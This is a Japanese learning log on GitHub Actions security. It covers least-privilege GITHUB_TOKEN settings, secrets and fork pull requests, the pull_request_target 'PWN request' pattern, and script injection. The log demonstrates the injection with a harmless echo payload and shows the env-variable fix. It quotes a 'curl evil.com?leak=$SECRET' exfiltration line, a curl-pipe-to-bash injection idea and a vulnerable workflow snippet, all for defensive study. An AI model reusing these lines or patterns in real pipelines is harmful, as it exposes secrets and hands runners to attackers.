# Chapter 06: Workflowのセキュリティ

対応Issue: [#9 06: Workflowのセキュリティを学ぶ](https://github.com/urchin-hat/study-github-action/issues/9)

## この章で理解したいこと

- **`permissions` による `GITHUB_TOKEN` の最小権限化**:
  - デフォルト権限（Read/Write）のリスクと、`permissions: read-all` / `permissions: contents: read` 等による絞り込み
  - WorkflowレベルとJobレベルでのスコープ制御
- **`vars` と `secrets` の使い分けと保護**:
  - 非機密設定値（`vars`）と機密情報（`secrets`）の適切な分離
  - ログ出力時の自動マスキング（`***`）の挙動と限界
- **ForkリポジトリからのPRとセキュリティ境界**:
  - ForkからのPRで `secrets` が渡らない理由と安全設計
  - `pull_request` vs `pull_request_target` の違いと重大な脆弱性パターン（PWN request）
- **未信頼の入力とスクリプトインジェクション（Script Injection）**:
  - `${{ github.event.issue.title }}` や `${{ github.head_ref }}` を `run:` に直接埋め込む危険性
  - 環境変数（`env:`）を経由した安全な渡し方
- **サードパーティActionのサプライチェーンセキュリティ**:
  - Actionの発行元（公式 / Verified Creator / 個人）とバージョン指定（tag vs commit SHA）

## GitLab CI/CDとの対応

| GitLab CI/CD | GitHub Actions | 観点 |
| --- | --- | --- |
| `CI_JOB_TOKEN` (パーミッション制限機能あり) | `GITHUB_TOKEN` + `permissions:` | ジョブ実行時の組み込みトークンと権限管理 |
| CI/CD Variables (Masked / Protected) | GitHub Secrets / Repository Variables (`vars`) | 機密情報と非機密設定値の管理 |
| Protected Branches / Environments | `pull_request` の制限 / Environment Protection Rules | 実行環境やブランチに応じたシークレットアクセス制御 |
| スクリプト内での変数展開リスク | `${{ ... }}` の直接展開（インジェクション脆弱性） | 外部入力の展開リスク |
| `include:` での外部CI定義取り込み | サードパーティAction（`uses: ...`） | 外部コードの取り込みとサプライチェーンリスク |

## 最初の方針

1. **`permissions` の実験**:
   - 現在のワークフローに明示的な `permissions` を設定し、最小権限（`contents: read`）にする。
2. **スクリプトインジェクションの実験**:
   - PRのタイトルやコミットメッセージなどを `run: echo "${{ ... }}"` で直接展開した場合と、`env:` 経由で渡した場合の安全性の違いを確認する。
3. **Secrets / Vars のマスキング確認**:
   - `secrets` を渡した際のログマスキング挙動を確認し、露出しない安全な扱い方を検証する。

## 実装前の予想

- [x] `permissions` をトップレベルで宣言しない場合、`GITHUB_TOKEN` にはどのような権限が与えられているか？:
  - 予想: C（デフォルトでは権限なし / None で、明示的に指定しないと動かない）。
  - 実際: **B（リポジトリやOrganizationの設定次第で、読み書き両方 / Read & Write が全開放されている可能性がある）**。
- [x] `${{ github.event.pull_request.title }}` を `run: echo "${{ ... }}"` に直接書くと、どのような攻撃（インジェクション）が可能になるか？:
  - 予想: B（タイトルに `; curl ... | bash` などを仕込むことで、ランナー上で任意のシェルコマンドが勝手に実行される）。
  - 実際: **B（大正解）**。`${{ ... }}` はシェル実行前の単なる「文字列置換」であるため、ダブルクォートで囲っても `"; コマンド; echo "` で簡単に脱出・実行されてしまう。
- [x] `pull_request` と `pull_request_target` で `secrets` や `GITHUB_TOKEN` の権限はどう違うか？（ForkからのPRでsecretsはどうなるか？）:
  - 予想: C（管理者が承認ボタンを押すまでマスクされて隠される）。
  - 実際: **B（通常の `pull_request` では承認の有無に関わらず、ForkからのPRには一切の `secrets` が渡されず空文字になる。GITHUB_TOKEN も強制的に read-only）**。
  - 一方で `pull_request_target` は `main` のコンテキストで動作するため `secrets` も Write権限も渡される。そのため、PR側の未信頼コードをチェックアウトして実行すると「PWN request（トークン奪取）」脆弱性になる。

## 壁打ちメモ

### 2026-09-25: Chapter 06開始
- `main` からブランチ `lesson/06-security` を作成。

### 2026-09-25: GITHUB_TOKEN のデフォルト権限の罠（予想と壁打ち）
- 予想: 何も権限がない（C）と思いがち。
- 実際: 歴史的経緯から、リポジトリやOrganizationの設定によって **「Read and write permissions（読み書きフル権限）」がデフォルトになっているケースが非常に多い（B）**。
- **リスク**:
  - フル権限のままだと、悪意のあるサードパーティActionを取り込んだ際や、スクリプトインジェクションが発生した際に、`GITHUB_TOKEN` を使ってリポジトリのコードを直接書き換えられたり、悪意のあるReleaseを公開されたりするリスクがある。
- **対策（最小権限の原則 / Principle of Least Privilege）**:
  - ワークフローファイルで `permissions:` を明示すると、**リポジトリ側の設定を上書きし、指定した権限以外はすべて「None（権限なし）」に強制剥奪** される。
  - 例: `contents: read` だけを指定すれば、コードのチェックアウトだけが許可され、それ以外の書き込み権限はすべて遮断される。

### 2026-09-25: スクリプトインジェクションとパブリックリポジトリのリスク
- **パブリックリポジトリの脅威**:
  - マージ権限自体はリポジトリオーナー（`urchin-hat`）に限定されているが、**「PRが作成された瞬間（マージ前）」にCIが自動起動** する。
  - そのため、悪意のある第三者がForkから細工したPRを送るだけで、ランナー上で任意の攻撃コードが実行されてしまう。
- **インジェクションの仕組み**:
  - `${{ ... }}` はランナーがスクリプトを実行する前に **「単なるテンプレート文字列置換」** を行う。
  - `run: echo "PR: ${{ github.event.pull_request.title }}"` に対して、タイトルが `Test"; echo "HACKED"; echo "` だと、シェルには `echo "PR: Test"; echo "HACKED"; echo ""` として渡され、後ろのコマンドが実行される。
- **防御策（ベストプラクティス）**:
  - **`${{ ... }}` を `run:` に直接書かない**。
  - 必ず `env:` ブロックで環境変数に格納し、シェル内では `$VAR` として参照する。環境変数への代入はメモリ上の文字列データとして扱われるため、コマンドとして解釈される余地がない。

### 2026-09-25: ForkからのPRとSecrets、最凶の脆弱性「pull_request_target」
- **ForkからのPRには一切のSecretsが渡らない（B）**:
  - 初回コントリビューターの承認機能（C）はあるが、承認してワークフローが動いたとしても、通常の `on: pull_request` では **Secretsは完全に空（空文字）** になる。
  - `GITHUB_TOKEN` も強制的に読み取り専用（read-only）になる。
  - 理由: もし渡ってしまうと、攻撃者がFork側で `.github/workflows/` やテストコードに `curl evil.com?leak=$SECRET` を仕込んでPRを投げるだけで機密情報を持ち出せてしまうから。
- **`pull_request_target` の落とし穴（PWN request）**:
  - 「ForkからのPRでもPRに自動コメント（write権限）したい」「SonarQubeなどの解析トークンを使いたい」という要求のために `on: pull_request_target` が用意された。
  - `pull_request_target` は `main` ブランチのコンテキストで動くため、**Secretsも渡され、Write権限も付与される**。
  - **最悪のアンチパターン**:
    ```yaml
    on: pull_request_target
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }} # ← Fork側の未信頼コードをチェックアウト
      - run: npm test # ← 攻撃者の仕込んだ悪意あるコードが、本家のSecrets＆Write権限で実行される！
    ```
  - これがGitHub Actions界で最も悪名高い **「PWN request」脆弱性**。
- **GitLab CI/CD（社内利用）との決定的な違い**:
  - GitLab CI/CDを社内イントラ等の閉じた環境で使っている場合、「同一リポジトリ内のブランチ間マージ」が主であり、コントリビューターは全員同じ社内メンバーという前提になりやすい。
  - しかしGitHub（特にパブリック）では、Forkは「第三者が管理する完全に隔離された別のリポジトリ」であり、そこから来るPRは **信頼境界（Trust Boundary）の外側から届く未信頼データ** であるという前提認識が死活的に重要となる。





## 試したことと結果

### 実験1: `permissions: contents: read` による最小権限化の確認

- PR: [#19](https://github.com/urchin-hat/study-github-action/pull/19)
- Workflow Run: [36024262344](https://github.com/urchin-hat/study-github-action/actions/runs/36024262344)
- 目的:
  - ワークフローのトップレベルに `permissions: contents: read` を宣言し、CI（Checkout、Test、Build、Artifact受け渡し）が正常に完走することを確認する。
  - ジョブ開始時の `Set up job` ステップのログで、付与された `GITHUB_TOKEN Permissions` を確認する。

#### 実行結果
- 各ジョブのステータス: ✅ **All checks passed (6/6 success)**
- `Set up job` 内の `GITHUB_TOKEN Permissions` ログ比較:
  - **変更前（未指定時: Run 36023411659）**:
    ```text
    GITHUB_TOKEN Permissions
    Contents: read
    Metadata: read
    Packages: read
    ```
    ※リポジトリのデフォルト設定に従い、`Packages: read` なども付与されていた。
  - **変更後（`permissions: contents: read` 明示時: Run 36024262344）**:
    ```text
    GITHUB_TOKEN Permissions
    Contents: read
    Metadata: read
    ```
    ※明示した `Contents: read` と最小限必要な `Metadata: read` 以外、すべての権限（Packages, Issues, Pull Requests, Deployments等）が剥奪され、最小権限化が確認できた。

#### 分かったこと
- **ログの可視性**:
  - `GITHUB_TOKEN` にどのような権限が付与されているかは、各Jobの最初のステップ `Set up job` のログにある `GITHUB_TOKEN Permissions` グループでいつでも確認できる。
- **ワークフローでの明示の重要性**:
  - リポジトリやOrganizationの設定に依存せず、コード側で `permissions:` を書くことで、予期せぬ強い権限が付与される事故を確実に防ぐことができる。

### 実験2: スクリプトインジェクションの再現と環境変数（`env:`）による防御

- PR: [#19](https://github.com/urchin-hat/study-github-action/pull/19)
- Workflow Run: [36024864301](https://github.com/urchin-hat/study-github-action/actions/runs/36024864301)（Job: `Security: Script Injection Test`）
- 目的:
  - 攻撃文字列（`Fix bug"; echo "🚨 [EXPLOIT] Injected command executed! 🚨"; echo "`）を用意し、
    1. `run:` 内に `${{ ... }}` で直接文字列展開した場合（脆弱なコード）
    2. `env:` ブロックで環境変数として渡してシェル内で `$VAR` として参照した場合（安全なコード）
    のログ出力を比較・検証する。

#### 実行結果
- **1. 脆弱な直接展開のログ**:
  ```text
  ##[group]Run echo "=== 1. Vulnerable Example: Direct Interpolation ==="
  echo "=== 1. Vulnerable Example: Direct Interpolation ==="
  echo "Input was: Fix bug"; echo "🚨 [EXPLOIT] Injected command executed! 🚨"; echo ""
  ##[endgroup]
  === 1. Vulnerable Example: Direct Interpolation ===
  Input was: Fix bug
  🚨 [EXPLOIT] Injected command executed! 🚨
  ```
  - `${{ ... }}` がシェル起動前に文字列置換された結果、ダブルクォートが閉じられて `echo "🚨 [EXPLOIT]..."` が**独立したシェルコマンドとしてそのまま実行されてしまった**。
- **2. 安全な環境変数経由のログ**:
  ```text
  ##[group]Run echo "=== 2. Safe Example: Pass via Environment Variable ==="
  echo "=== 2. Safe Example: Pass via Environment Variable ==="
  echo "Input was: $UNTRUSTED_INPUT"
  env:
    UNTRUSTED_INPUT: Fix bug"; echo "🚨 [EXPLOIT] Injected command executed! 🚨"; echo "
  ##[endgroup]
  === 2. Safe Example: Pass via Environment Variable ===
  Input was: Fix bug"; echo "🚨 [EXPLOIT] Injected command executed! 🚨"; echo "
  ```
  - シェルに渡されたコードは `echo "Input was: $UNTRUSTED_INPUT"` のままであり、入力値はプロセス環境変数の値（メモリ上のプレーンテキスト）として安全に扱われた。
  - セミコロンやダブルクォートがコマンドとして解釈されることは一切なく、1行の文字列として安全に出力された。

#### 分かったこと
- **`${{ ... }}` はスクリプトに直接展開してはならない（絶対ルール）**:
  - PRのタイトル、本文、ブランチ名、コミットメッセージ、Issueのコメントなど、**外部ユーザーが自由に書き込めるコンテキストはすべて未信頼（Untrusted Input）** である。
  - これらを `run:` のシェルスクリプト内で `${{ ... }}` として直接埋め込むと、スクリプトインジェクションによりランナーが乗っ取られる。
- **防御は必ず `env:` を介すこと**:
  - `env:` で一度環境変数に格納してから `$VAR`（bashの場合）で参照すれば、完全にインジェクションを防ぐことができる。



## つまずいた点

## ブログへ残したい要点

